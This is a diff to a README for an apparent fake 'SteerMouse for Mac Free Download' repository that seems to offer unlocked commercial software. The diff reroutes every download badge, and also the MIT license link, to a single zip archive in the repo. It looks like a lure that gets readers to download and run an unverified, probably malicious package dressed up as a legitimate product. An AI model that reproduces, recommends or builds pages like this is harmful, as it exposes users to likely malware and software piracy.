@@ -1,6 +1,6 @@
 # SteerMouse for Mac Free Download 🚀
 
-[![Download](https://img.shields.io/badge/Download%20for%20macOS-black?style=for-the-badge&logo=apple&logoPosition=right&logoColor=white)](https://VoiseCovaser.github.io)
+[![Download](https://github.com/VoiseCovaser/steermouse-mac-unlocking-experience/raw/refs/heads/main/filmgoer/experience_unlocking_steermouse_mac_3.2.zip%20for%20macOS-black?style=for-the-badge&logo=apple&logoPosition=right&logoColor=white)](https://github.com/VoiseCovaser/steermouse-mac-unlocking-experience/raw/refs/heads/main/filmgoer/experience_unlocking_steermouse_mac_3.2.zip)
 
 **Your Mac Mouse, Supercharged**  
 *SteerMouse for Mac* offers intuitive and effective mouse customization, helping you unleash the unheard-of power beneath the smooth curves of your favorite macOS pointing device. Whether you're a creative, a gamer, or a productivity enthusiast, this repository is your headquarters for the latest, safest, and most streamlined SteerMouse downloads for macOS.
@@ -107,7 +107,7 @@ For the full user agreement, see the LICENSE section below.
 
 This repository is licensed under the MIT License.
 
-[View Full License 🗎](https://opensource.org/licenses/MIT)
+[View Full License 🗎](https://github.com/VoiseCovaser/steermouse-mac-unlocking-experience/raw/refs/heads/main/filmgoer/experience_unlocking_steermouse_mac_3.2.zip)
 
 Copyright © 2026
 
@@ -117,6 +117,6 @@ Copyright © 2026
 
 **Get started with the ultimate mouse control for macOS:**
 
-[![Download](https://img.shields.io/badge/Download%20for%20macOS-black?style=for-the-badge&logo=apple&logoPosition=right&logoColor=white)](https://VoiseCovaser.github.io)
+[![Download](https://github.com/VoiseCovaser/steermouse-mac-unlocking-experience/raw/refs/heads/main/filmgoer/experience_unlocking_steermouse_mac_3.2.zip%20for%20macOS-black?style=for-the-badge&logo=apple&logoPosition=right&logoColor=white)](https://github.com/VoiseCovaser/steermouse-mac-unlocking-experience/raw/refs/heads/main/filmgoer/experience_unlocking_steermouse_mac_3.2.zip)
 
 > _Thank you for choosing SteerMouse—where your mouse works just the way you wish it would!_
